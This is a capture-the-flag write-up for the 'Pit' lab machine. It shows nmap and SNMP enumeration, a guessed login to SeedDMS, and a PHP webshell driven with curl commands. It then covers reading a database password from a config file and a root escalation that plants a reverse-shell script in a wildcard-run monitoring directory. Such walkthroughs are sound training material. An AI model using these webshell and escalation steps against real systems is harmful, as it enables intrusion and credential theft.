# Pit

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.228.106
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 01:05 EDT
Nmap scan report for 10.129.228.106
Host is up (0.0095s latency).
Not shown: 65501 filtered tcp ports (no-response), 31 filtered tcp ports (host-unreach)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9090/tcp open  zeus-admin
```

2 HTTP ports for this one.&#x20;

### Web Rabbit Holes

Port 9090 was a HTTPS site with a login page:

<figure><img src="../../../.gitbook/assets/image (3445).png" alt=""><figcaption></figcaption></figure>

We had no credentials and weak default credentials didn't work. Port 80 hosted a Red Hat default page:

<figure><img src="../../../.gitbook/assets/image (2492).png" alt=""><figcaption></figcaption></figure>

Directory, subdomain and other web scans all didn't find anything. So this was an obvious rabbit hole.

### UDP Ports --> SNMP Enum

I did another UDP scan in case I missed some stuff:

```
$ sudo nmap -sU --top-ports 30 --min-rate 5000 10.129.228.106
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 01:09 EDT
Nmap scan report for 10.129.228.106
Host is up (0.0089s latency).

PORT      STATE         SERVICE
53/udp    open|filtered domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
111/udp   open|filtered rpcbind
123/udp   filtered      ntp
135/udp   open|filtered msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   open          snmp
162/udp   open|filtered snmptrap
445/udp   open|filtered microsoft-ds
500/udp   open|filtered isakmp
514/udp   open|filtered syslog
520/udp   open|filtered route
631/udp   open|filtered ipp
996/udp   open|filtered vsinet
997/udp   open|filtered maitrd
998/udp   open|filtered puparp
999/udp   open|filtered applix
1434/udp  open|filtered ms-sql-m
1701/udp  open|filtered L2TP
1900/udp  open|filtered upnp
3283/udp  open|filtered netassistant
4500/udp  filtered      nat-t-ike
5353/udp  open|filtered zeroconf
49152/udp filtered      unknown
49153/udp filtered      unknown
49154/udp open|filtered unknown
```

We can see that SNMP is opened and not filtered. We can take a closer look at its version using `nmap` again.

```
$ sudo nmap -sU -p 161 -sV 10.129.228.106 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 01:10 EDT
Nmap scan report for 10.129.228.106
Host is up (0.0085s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
Service Info: Host: pit.htb

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds
```

It seems that this is a SNMPv1 server and we might be able to access it via `snmpwalk`. There was a lot of information returned with a default and an extended scan:

```
$ snmpwalk -c public -v1 10.129.228.106 .1
iso.3.6.1.2.1.1.1.0 = STRING: "Linux pit.htb 4.18.0-305.10.2.el8_4.x86_64 #1 SMP Tue Jul 20 17:25:16 UTC 2021 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (276725) 0:46:07.25
iso.3.6.1.2.1.1.4.0 = STRING: "Root <root@localhost> (configure /etc/snmp/snmp.local.conf)"
iso.3.6.1.2.1.1.5.0 = STRING: "pit.htb"
iso.3.6.1.2.1.1.6.0 = STRING: "Unknown (edit /etc/snmp/snmpd.conf)"
<TRUNCATED>
iso.3.6.1.4.1.2021.9.1.2.2 = STRING: "/var/www/html/seeddms51x/seeddms"
<TRUNCATED>
$ snmpwalk -c public -v1 10.129.228.106 NET-SNMP-EXTEND-MIB::nsExtendObjects
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".24 = STRING: michelle             user_u               s0                   *
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".25 = STRING: root                 unconfined_u         s0-s0:c0.c1023       *
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".26 = STRING: System uptime
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".27 = STRING:  01:12:54 up 47 min,  0 users,  load average: 0.08, 0.02, 0.02
End of MIB
```

So we have 2 users, `michelle` and `root`. We als ofound a new directory at Seed DMS or something. When we view the certificate of the HTTPS site on port 9090, we can see a new subdomain to enumerate.

<figure><img src="../../../.gitbook/assets/image (2784).png" alt=""><figcaption></figcaption></figure>

### Seed DMS

After adding the new domain to our hosts file, we can head to `http://dms-pit.htb/seeddms51x/seeddms` and find another login page:

<figure><img src="../../../.gitbook/assets/image (100).png" alt=""><figcaption></figcaption></figure>

I tried a few credentials, and found that `michelle:michelle` was the right one to login.

<figure><img src="../../../.gitbook/assets/image (1727).png" alt=""><figcaption></figcaption></figure>

We can view the change log from the administrator, which states the version of Seed DMS that is currently being used.

<figure><img src="../../../.gitbook/assets/image (2617).png" alt=""><figcaption></figcaption></figure>

It appears that this is version 5.1.15, which does not have any vulnerabilities via `searchsploit`. This service supports file uploads and is PHP based, so let's try to upload a webshell within Michells' folder.

<figure><img src="../../../.gitbook/assets/image (3359).png" alt=""><figcaption></figcaption></figure>

This had the document ID of 29, but I didn't know what to do further. Checking the `searchsploit` output again, we can see that there are RCE exploits for this but they are of the wrong version.

```
$ searchsploit seed    
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
Deluge 1.3.15 - 'Webseeds' Denial of Service (PoC)                   | windows/dos/46884.py
Seeddms 5.1.10 - Remote Command Execution (RCE) (Authenticated)      | php/webapps/50062.py
SeedDMS 5.1.18 - Persistent Cross-Site Scripting                     | php/webapps/48324.txt
SeedDMS < 5.1.11 - 'out.GroupMgr.php' Cross-Site Scripting           | php/webapps/47024.txt
SeedDMS < 5.1.11 - 'out.UsrMgr.php' Cross-Site Scripting             | php/webapps/47023.txt
SeedDMS versions < 5.1.11 - Remote Command Execution                 | php/webapps/47022.txt
SetSeed CMS 5.8.20 - 'loggedInUser' SQL Injection                    | php/webapps/18065.txt
Wordpress Plugin Maintenance Mode by SeedProd 5.1.1 - Persistent Cro | php/webapps/48724.txt
--------------------------------------------------------------------- ---------------------------------
```

I decided to try the one for v5.1.11 again just in case. Following the PoC, I was able to replicate it and get RCE.

```
$ curl http://dms-pit.htb/seeddms51x/data/1048576/30/1.php?cmd=id 
uid=992(nginx) gid=988(nginx) groups=988(nginx) context=system_u:system_r:httpd_t:s0
```

Great! I tried to get a reverse shell as this user, but it seems that I couldn't even download any files or make any external connections. So we probably need to look around further.&#x20;

### CentOS Credentials

Since we had a webshell, I wanted to see if we could find the credentials for the CentOS interface we found earlier. We can slowly enumerate the file system:

```
$ curl -G --data-urlencode 'cmd=ls ../' http://dms-pit.htb/seeddms51x/data/1048576/30/1.php 
21
29
30
$ curl -G --data-urlencode 'cmd=ls ../../' http://dms-pit.htb/seeddms51x/data/1048576/30/1.php
1048576
backup
cache
conf
log
lucene
staging
$ curl -G --data-urlencode 'cmd=ls ../../conf' http://dms-pit.htb/seeddms51x/data/1048576/30/1.php
settings.xml
settings.xml.template
stopwords.txt
```

Within `settings.xml`, we can find a set of credentials

```markup
<database dbDriver="mysql" dbHostname="localhost" dbDatabase="seeddms" dbUser="seeddms" dbPass="ied^ieY6xoquu" doNotCheckVersion="false">
```

This doesn't work with SSH, but we can use this to login to the CentOS interface as `michelle`.&#x20;

<figure><img src="../../../.gitbook/assets/image (3011).png" alt=""><figcaption></figcaption></figure>

In the bottom left corner, we can access the Terminal application, which is basically another webshell as `michelle`.

<figure><img src="../../../.gitbook/assets/image (2521).png" alt=""><figcaption></figcaption></figure>

Now, we can grab the user flag and also a reverse shell as the user.

## Privilege Escalation

### SNMP Processes --> Injection

I ran a LinPEAS scan on the machine to enumerate for me, and didn't find anything interesting. I wanted to see the processes that were running on the machine, and this could be done using `snmpwalk` as we did earlier. This is because `root` is probably running SNMP here.

```
iso.3.6.1.4.1.8072.1.3.2.2.1.2.6.109.101.109.111.114.121 = STRING: "/usr/bin/free"
iso.3.6.1.4.1.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 = STRING: "/usr/bin/monitor"
```

There were 2 binaries running, `free` and `monitor`. The former was an ELF binary, while the latter is, interestingly, a `bash` script.

```bash
[michelle@pit tmp]$ cat /usr/bin/monitor
#!/bin/bash

for script in /usr/local/monitoring/check*sh
do
    /bin/bash $script
done
```

It seems to be running any script using a wildcard. Plus, the user can write to the directory where the script resides. We can just create a script that gives us a reverse shell using a `bash` one-liner. Download that into the directory. Then, we can run the script by using `snmpwalk`:

```bash
snmpwalk -v1 -c public 10.129.228.106 NET-SNMP-EXTEND-MIB::nsExtendObjects
```

<figure><img src="../../../.gitbook/assets/image (1398).png" alt=""><figcaption></figcaption></figure>
